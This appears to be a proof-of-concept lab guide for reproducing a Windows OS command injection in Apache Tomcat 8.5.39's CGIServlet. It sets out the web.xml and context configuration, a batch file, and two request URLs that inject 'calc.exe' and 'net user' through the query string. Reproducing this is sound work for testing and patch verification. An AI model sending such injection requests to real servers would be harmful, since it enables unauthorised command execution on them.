#### Vulnerability Environment
```
Tomcat 8.5.39

Jdk 8u121
```

#### Edit `web.xml` file 
```
<servlet>
        <servlet-name>cgi</servlet-name>
        <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
        <init-param>
          <param-name>debug</param-name>
          <param-value>0</param-value>
        </init-param>
        <init-param>
          <param-name>cgiPathPrefix</param-name>
          <param-value>WEB-INF/cgi-bin</param-value>
        </init-param>
        <init-param>
          <param-name>executable</param-name>
          <param-value></param-value>
        </init-param>
         <load-on-startup>5</load-on-startup>
</servlet> 

<!-- The mapping for the CGI Gateway servlet -->

    <servlet-mapping>
        <servlet-name>cgi</servlet-name>
        <url-pattern>/cgi-bin/*</url-pattern>
    </servlet-mapping>
```

#### Edit `content.xml` file
```
<Context privileged="true">

    <!-- Default set of monitored resources. If one of these changes, the    -->
    <!-- web application will be reloaded.                                   -->
    <WatchedResource>WEB-INF/web.xml</WatchedResource>
    <WatchedResource>${catalina.base}/conf/web.xml</WatchedResource>

    <!-- Uncomment this to disable session persistence across Tomcat restarts -->
    <!--
    <Manager pathname="" />
    -->
</Context>
```

#### Create `hello.bat` file  
```
echo Content-type: text/html     //whatever the content in batch file
```

#### Move the directory `WEB-INF` to `$CATALINA_HOME/webapps/ROOT` and then restart tomcat server

#### Send a request to the target tomcat server with Windows OS command injection
```
http://localhost:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Ccalc.exe

http://localhost:8080/cgi-bin/hello.bat?&net+user
```
